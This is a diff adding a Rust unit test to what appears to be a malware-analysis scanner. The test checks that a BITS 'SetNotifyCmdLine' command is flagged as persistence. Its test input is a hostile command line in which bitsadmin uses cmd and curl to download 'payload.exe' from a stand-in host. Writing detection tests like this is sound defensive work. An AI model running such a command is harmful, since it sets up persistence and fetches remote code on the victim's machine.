@@ -25032,6 +25032,34 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_setnotifycmdline_in_deob_text_emits_persistence() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /SetNotifyCmdLine job1 cmd.exe "/c curl -o C:\Temp\notify.exe https://bits-notify-text.example/payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "BITS"
+                    && key == "job1"
+                    && value_name == "SetNotifyCmdLine"
+                    && command == r#"cmd.exe /c curl -o C:\Temp\notify.exe https://bits-notify-text.example/payload.exe"#
+            )
+        });
+        assert!(
+            has,
+            "no BITS SetNotifyCmdLine persistence in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
